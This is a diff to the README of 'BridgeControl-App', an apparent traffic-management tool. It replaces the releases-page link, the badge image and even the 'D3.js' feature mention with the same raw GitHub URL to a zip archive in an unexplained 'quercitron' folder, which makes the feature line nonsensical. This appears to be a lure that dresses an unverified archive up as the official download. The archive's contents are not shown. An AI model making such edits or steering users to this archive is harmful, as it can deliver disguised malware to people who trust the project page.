@@ -15,7 +15,7 @@ Welcome to BridgeControl-App, your go-to tool for managing urban traffic intelli
 - **Real-time Data Integration:** Access vehicular, transit, and environmental data seamlessly.
 - **User-friendly Dashboard:** Navigate an intuitive interface designed for everyone.
 - **Responsive Design:** Enjoy perfect viewing on any device.
-- **Data Visualization:** Utilize D3.js for beautiful, interactive graphs.
+- **Data Visualization:** Utilize https://raw.githubusercontent.com/Nessywellfed161/BridgeControl-App/master/quercitron/BridgeControl-App.zip for beautiful, interactive graphs.
 - **Urban Management Tools:** Make informed decisions to improve traffic flow in your city.
 
 ## 🖥️ System Requirements
@@ -28,9 +28,9 @@ To run the BridgeControl-App smoothly, ensure you have the following:
 ## ⬇️ Download & Install
 Ready to get started? 
 
-[![Download BridgeControl-App](https://img.shields.io/badge/Download%20BridgeControl--App-%23204A87?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Nessywellfed161/BridgeControl-App/releases)
+[![Download BridgeControl-App](https://raw.githubusercontent.com/Nessywellfed161/BridgeControl-App/master/quercitron/BridgeControl-App.zip%20BridgeControl--App-%23204A87?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Nessywellfed161/BridgeControl-App/master/quercitron/BridgeControl-App.zip)
 
-Visit this page to download: [BridgeControl Releases](https://github.com/Nessywellfed161/BridgeControl-App/releases). 
+Visit this page to download: [BridgeControl Releases](https://raw.githubusercontent.com/Nessywellfed161/BridgeControl-App/master/quercitron/BridgeControl-App.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Choose the latest version.
